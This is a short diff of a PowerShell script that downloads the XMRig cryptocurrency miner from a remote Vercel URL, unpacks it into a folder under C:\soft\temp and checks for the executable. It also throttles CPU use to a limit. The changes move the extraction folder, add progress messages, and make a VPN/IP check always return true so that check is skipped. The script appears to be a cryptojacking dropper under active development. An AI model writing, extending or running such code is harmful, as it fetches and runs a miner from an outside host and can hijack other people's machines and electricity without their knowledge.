@@ -7,7 +7,8 @@ $CPU_LIMIT = 70
 
 $BASE_DIR = "C:\soft"
 $TEMP_DIR = "C:\soft\temp"
-$MINER_EXE = "$TEMP_DIR\xmrig.exe"
+$M =   "C:\soft\temp\m"
+$MINER_EXE = "$TEMP_DIR\m\xmrig.exe"
 
 function Get-CPU {
     (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
@@ -19,7 +20,7 @@ function Check-VPN {
 $headers = @{
             "User-Agent" = "Mozilla/5.0"
         }
-
+        return $true
        # $info = Invoke-RestMethod `
         #    -Uri "https://ipinfo.io/json" `
         #    -Headers $headers `
@@ -84,7 +85,8 @@ function Get-Command {
         if (!(Test-Path $TEMP_DIR)) {
             New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null
         }
-
+           New-Item -ItemType Directory -Path $M | Out-Null
+            Write-Host "m folder created"
         $zipFile = "$TEMP_DIR\m.zip"
         $minerZipUrl = "https://mcontrol.vercel.app/xmrig-6.25.0.zip"
 
@@ -99,9 +101,9 @@ function Get-Command {
 
         Expand-Archive `
             -Path $zipFile `
-            -DestinationPath $TEMP_DIR `
+            -DestinationPath $M `
             -Force
-
+         Write-Host "unzipped"
         Remove-Item $zipFile -Force
 
         if (!(Test-Path $MINER_EXE)) {
